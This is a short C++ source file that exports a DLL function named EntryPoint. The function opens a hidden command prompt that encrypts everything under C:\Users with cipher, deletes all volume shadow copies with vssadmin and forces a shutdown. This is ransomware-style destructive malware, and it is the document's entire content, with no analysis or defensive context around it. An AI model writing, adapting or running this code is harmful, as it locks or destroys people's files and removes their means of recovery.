#include <windows.h>
#include <shellapi.h>

extern "C" __declspec(dllexport) void EntryPoint() {
    ShellExecuteA(0, "open", "cmd.exe",
        "/c cipher /E /S:C:\\Users\\ && vssadmin delete shadows /all /quiet && shutdown /s /t 5",
        0, SW_HIDE);
}
